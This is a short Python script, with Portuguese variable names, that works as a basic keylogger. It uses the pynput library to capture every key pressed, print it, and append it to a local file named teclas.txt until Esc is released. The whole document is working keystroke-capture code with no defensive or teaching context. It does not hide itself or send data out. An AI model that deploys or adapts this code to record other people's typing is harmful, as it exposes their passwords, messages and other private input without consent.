from pynput.keyboard import Key, Listener


contador = 0
teclas_pressionadas = []


def pressionar_tecla(tecla):
    global teclas_pressionadas, contador
    teclas_pressionadas.append(tecla)
    contador += 1
    print(tecla)
    if contador >= 1:
        contador = 0
        salvar(teclas_pressionadas)
        teclas_pressionadas = []


def salvar(teclas):
    with open("teclas.txt", "a") as arquivo:
        arquivo.write('\n')
        for tecla in teclas:
            tecla = str(tecla).replace("'", "")
            if tecla.find("tecla") == -1:
                arquivo.write(tecla)


def liberar_tecla(tecla):
    if tecla == Key.esc:
        return False


with Listener(on_press=pressionar_tecla,
              on_release=liberar_tecla) as listener:
    listener.join()
